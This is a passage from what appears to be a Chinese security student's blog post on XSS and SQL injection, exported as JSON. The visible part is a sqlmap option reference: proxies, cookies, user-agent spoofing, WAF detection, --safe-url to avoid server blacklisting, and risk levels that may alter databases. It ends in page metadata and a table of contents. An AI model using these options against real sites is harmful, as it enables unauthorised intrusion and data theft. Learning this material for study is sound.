//查看所有表</span></span></code></pre></div><p>help:</p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">-r 1.txt            对于用post方法提交的，参数不在URL里面的网页，可以先截获数据，保存成文件再用这个参数执行</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">-l log.txt          可以将代理的日志作为目标去检测[见下图]</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">-m 1.txt            对于多个URL，可以一排一个写入文件后加载</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">--force-ssl         对于使用SSL的URL要在后面加上这个参数</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">--data              对于使用post方法，可以将参数写在data后面</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">--param-del=&quot;&quot;          </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">--cookie=&quot;&quot;  level 2        对于需要验证才能访问的URL，可以加上cookie值验证，如果要检测cookie是否有注入漏洞，level要高于1</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">--random-agent          使用随机的user-agent</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">--user-agent=&quot;&quot;  level 3    指定user-agent，如要检测它是否有漏洞level要高于2</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">--header=&quot;\\n&quot;           指定头信息，如User-Agent:dsacs，大小写敏感，多个用\\n分隔</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">--method=GET POST       设置提交方式，默认一个一个的尝试</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">--auth-type             如果是基于http的验证，如Basic NTLM Digest，可直接加类型再配合下一个参数使用</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">--auth-cred &quot;user:pass&quot;     填写账号和密码</span></span>\n<span class=\"line\"><span style=\"color: #babed8\"> --proxy=&quot;http:127.0.0.1:8087&quot;  使用代理</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">--proxy-cred=&quot;name:pass&quot;    如果代理要密码的话</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">--ignore-proxy          强制不使用代理</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">--delay             请求延迟间隔，单位秒，默认无延迟</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">--retries           链接失败重试次数3</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">--timeout           链接超时时间30</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">--randomize=&quot;param&quot;     使用和源参数类型长度一致的参数</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">sqlmap -l l.log --scope=&quot;(www)?\\.target\\.(com|net|org)&quot;     这是一个正则表达式，是对于log文件里面URL过多时，进行筛选，这里是只要com/net/org结尾的域名</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">sqlmap -l 2.log --scope=&quot;(19)?\\.168\\.20\\.(1|11|111)&quot;        同上，筛选19*.168.20.1/11/111这几个网段的IP</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">--safe-url=&quot;url&quot;        设置正确的URL，因为如果一直尝试错误的URL可能会被服务器拉黑，过几次登下正确的防止这个发生</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">--safe-freq 10          尝试的与正确的URL的交换频率</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">--skip-urlencode        有的URL在get方式提交时没编码，就要用这个</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">--eval=&quot;&quot;php代码      这个后面可以跟PHP代码，能够执行</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">--keep-alive            保持连接会降低资源使用，但是不能与代理兼容</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">--predict-output        能够在找到一个信息后缩小检测的范围，不能与--threads兼容</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">--null-connection       只看返回文件的大小，不要他的内容与--text-only不兼容</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">--threads           最大并发数，默认1，最大不要超过10，盲注时一次返回一个字符【7次请求】</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">-o              使用除了--threads的全部的优化参数</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">-p              指定参数，使level失效</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">-skip               排除不扫描的参数</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">                对于伪静态网页，就在参数后面加*</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">--dbms              接数据库管理系统，如MySQL</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">--os                接系统，如Linux</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">--invalid-bignum        使用大数作为假的值</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">--invalid-logical       使用逻辑数作为假的值</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">--no-cat            对于接收到的null不自动转换成空格</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">--no-escape         不使用逃逸，就是不把&#39;转换成asii码形式</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">--prefix            在参数前指定前缀</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">--suffix            在参数后指定后缀</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">--level             设置检查的等级，默认为1，共5个，可以查看/usr/share/sqlmap/xml/payloads这个文件了解详细的信息</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">--risk              设置风险等级，默认是安全的检查，第四等可能会修改数据库内容</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">--string            当页面含有这个字符串时为真</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">--not-string            当页面不含这个字符串时为真</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">--regexp            用正则表达式判断</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">--code              当状态代码为*时为真</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">--text-only         页面含有*时为真</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">--titles            页面标题为*时为真</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">--techniques </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">B E U S T           使用什么检查技术，默认所有，这里分别是基于布尔的盲注，基于错误的判断，联合查询，堆积，基于时间的查询</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">--time-sec          </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">--union-cols            联合查询第几列到第几列</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">--union-char            用select null,1:2  这种，可能会出错，就讲这个null换成其他数字占位</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">--second-order          当注入后在第二个页面显示错误信息，这里就接上显示错误信息的地方</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">-fingerprint            指纹信息</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">--banner            版本信息</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">--batch             按照软件默认设置，自动回答</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">--count             计数</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">-s              将这个会话保存下次继续</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">-t              将这些数据保存</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">--charset           强制设置数据库编码</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">--crawl             设置蜘蛛爬行的深度</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">--csv-del           设置下载的数据的分隔方式，默认是,</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">--dbms-cred         设置数据库用户</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">--flush-session         清空以前的会话数据</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">--fresh-queries         不清空会话，重新查询</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">--hex               一16进制编码的方式传输数据</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">--output-dir            会话输出文件夹</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">--parse-errors          显示MySQL错误信息</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">--save              保存当前配置为文件</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">-z              特别的助记方式，后面接的只要是独一无二的企鹅存在的就可以用，如user-agent可以用ueraet.</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">--answers           这个可以对一些特定的问题作出回答，在自动化注入中用</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">--check-waf         检查是否含有waf等</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">--identify-waf          彻底的检查waf等的信息</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">--smart     当有大量目标时，这个就只检查基于错误的注入点</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">--mobile    模拟智能手机去扫描</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">--wizard    向导模式</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">--purge-out 清除输出内容</span></span></code></pre></div>","text":"XSS基础介绍XSS过滤绕过总结 - 随风kali - 博客园 (cnblogs.com) 跨站脚本，英文全称：Cross-Site Scripting 通过输...","permalink":"/post/第四次课程-XSS与SQL注入","photos":[],"count_time":{"symbolsCount":"7.9k","symbolsTime":"7 mins."},"categories":[],"tags":[{"name":"网络安全","slug":"网络安全","count":21,"path":"api/tags/网络安全.json"},{"name":"学习日志","slug":"学习日志","count":21,"path":"api/tags/学习日志.json"},{"name":"视频会议","slug":"视频会议","count":4,"path":"api/tags/视频会议.json"},{"name":"XSS基础","slug":"XSS基础","count":1,"path":"api/tags/XSS基础.json"},{"name":"SQL注入","slug":"SQL注入","count":1,"path":"api/tags/SQL注入.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#XSS%E5%9F%BA%E7%A1%80\"><span class=\"toc-text\">XSS基础</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%BB%8B%E7%BB%8D\"><span class=\"toc-text\">介绍</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#SQL%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">SQL注入</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%96%87%E7%AB%A0%E6%8E%A8%E8%8D%90\"><span class=\"toc-text\">文章推荐</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%A6%82%E8%BF%B0\"><span class=\"toc-text\">概述</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B\"><span class=\"toc-text\">攻击流程</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%B3%A8%E5%85%A5%E7%82%B9%E7%B1%BB%E5%9E%8B\"><span class=\"toc-text\">注入点类型</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%9F%BA%E4%BA%8Eunion%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E7%9A%84%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96\"><span class=\"toc-text\">基于union联合查询的信息获取</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%88%A4%E6%96%AD%E6%9F%A5%E8%AF%A2%E5%88%97%E6%95%B0\"><span class=\"toc-text\">判断查询列数</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%9F%BA%E4%BA%8E%E6%8A%A5%E9%94%99%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96\"><span class=\"toc-text\">基于报错信息获取</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E6%8A%A5%E9%94%99%E5%87%BD%E6%95%B0\"><span class=\"toc-text\">报错函数</span></a></li></ol></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E7%9B%B2%E6%B3%A8\"><span class=\"toc-text\">盲注</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E8%BF%9B%E8%A1%8C%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6\"><span class=\"toc-text\">进行远程控制</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E8%B7%A8%E5%BA%93%E6%9F%A5%E8%AF%A2\"><span class=\"toc-text\">跨库查询</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E8%AF%B4%E6%98%8E\"><span class=\"toc-text\">说明</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%9F%A5%E8%AF%A2%E5%BA%93\"><span class=\"toc-text\">查询库</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%9F%A5%E8%AF%A2%E8%A1%A8\"><span class=\"toc-text\">查询表</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%9F%A5%E6%89%BE%E5%88%97\"><span class=\"toc-text\">查找列</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%9F%A5%E8%AF%A2%E7%BB%93%E6%9E%9C\"><span class=\"toc-text\">查询结果</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#INFORMATION-SCHEMA%E5%BA%93\"><span class=\"toc-text\">INFORMATION_SCHEMA库</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#SCHEMATA%E8%A1%A8\"><span class=\"toc-text\">SCHEMATA表</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#SCHEMA-NAME%E5%AD%97%E6%AE%B5-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D\"><span class=\"toc-text\">SCHEMA_NAME字段: 数据库名</span></a></li></ol></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#TABLES%E8%A1%A8\"><span class=\"toc-text\">TABLES表</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#TABLE-SCHEMA%E5%AD%97%E6%AE%B5-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D\"><span class=\"toc-text\">TABLE_SCHEMA字段: 数据库名</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#TABLE-NAME%E5%AD%97%E6%AE%B5-%E8%A1%A8%E5%90%8D\"><span class=\"toc-text\">TABLE_NAME字段: 表名</span></a></li></ol></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#COLUMNS%E8%A1%A8\"><span class=\"toc-text\">COLUMNS表</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#TABLE-SCHEMA%E5%AD%97%E6%AE%B5-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D-1\"><span class=\"toc-text\">TABLE_SCHEMA字段: 数据库名</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#TABLE-NAME%E5%AD%97%E6%AE%B5-%E8%A1%A8%E5%90%8D-1\"><span class=\"toc-text\">TABLE_NAME字段: 表名</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#COLUMN-NAME%E5%AD%97%E6%AE%B5-%E5%88%97%E5%90%8D\"><span class=\"toc-text\">COLUMN_NAME字段: 列名</span></a></li></ol></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E9%98%B2%E8%8C%83%E6%8E%AA%E6%96%BD\"><span class=\"toc-text\">防范措施</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#SQLmap%E4%BD%BF%E7%94%A8\"><span class=\"toc-text\">SQLmap使用</span></a></li></ol></li></ol></li></ol>","author":{"name":"Myprefer","slug":"blog-author","avatar":"https://gravatar.com/avatar/d195051819ce742212020a79d768fb6c?size=256&cache=1710768150791","link":"https://github.com/Myprefer","description":"web security learner, ML learner","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"hidden":false,"prev_post":{"title":"小迪安全-P4","uid":"38e97d07cb4887821026c06ecc181448","slug":"小迪安全-P4","date":"2024-02-03T12:01:45.000Z","updated":"2024-02-03T13:58:50.083Z","comments":true,"path":"api/articles/小迪安全-P4.json","keywords":null,"cover":null,"text":"加密识别(猜测)算法编码类型 看密文位数 看密文的特征(数字, 字母, 大小写, 符号等) 看当前密文存在的地方(Web, 数据库, 操作系统等应用) 获取 (...","permalink":"/post/小迪安全-P4","photos":[],"count_time":{"symbolsCount":214,"symbolsTime":"1 mins."},"categories":[],"tags":[{"name":"网络安全","slug":"网络安全","count":21,"path":"api/tags/网络安全.json"},{"name":"学习日志","slug":"学习日志","count":21,"path":"api/tags/学习日志.json"},{"name":"小迪安全","slug":"小迪安全","count":8,"path":"api/tags/小迪安全.json"},{"name":"基础入门","slug":"基础入门","count":5,"path":"api/tags/基础入门.json"}],"author":{"name":"Myprefer","slug":"blog-author","avatar":"https://gravatar.com/avatar/d195051819ce742212020a79d768fb6c?size=256&cache=1710768150791","link":"https://github.com/Myprefer","description":"web security learner, ML learner","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"第三周课程-SQL与PHP","uid":"bcd80a5ebbb48bb852bbee5672f0a5b3","slug":"第三周课程-SQL与PHP","date":"2024-02-01T07:08:19.000Z","updated":"2024-02-02T15:46:20.068Z","comments":true,"path":"api/articles/第三周课程-SQL与PHP.json","keywords":null,"cover":[],"text":"MySQL基本操作sql-- 创建数据库 CREATE DATABASE 数据库名; -- 选择数据库 USE 数据库名; -- 创建表格 CREATE TAB...","permalink":"/post/第三周课程-SQL与PHP","photos":[],"count_time":{"symbolsCount":"6.6k","symbolsTime":"6 mins."},"categories":[],"tags":[{"name":"网络安全","slug":"网络安全","count":21,"path":"api/tags/网络安全.json"},{"name":"学习日志","slug":"学习日志","count":21,"path":"api/tags/学习日志.json"},{"name":"SQL基础","slug":"SQL基础","count":2,"path":"api/tags/SQL基础.json"},{"name":"视频会议","slug":"视频会议","count":4,"path":"api/tags/视频会议.json"},{"name":"PHP基础","slug":"PHP基础","count":1,"path":"api/tags/PHP基础.json"}],"author":{"name":"Myprefer","slug":"blog-author","avatar":"https://gravatar.com/avatar/d195051819ce742212020a79d768fb6c?size=256&cache=1710768150791","link":"https://github.com/Myprefer","description":"web security learner, ML learner","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}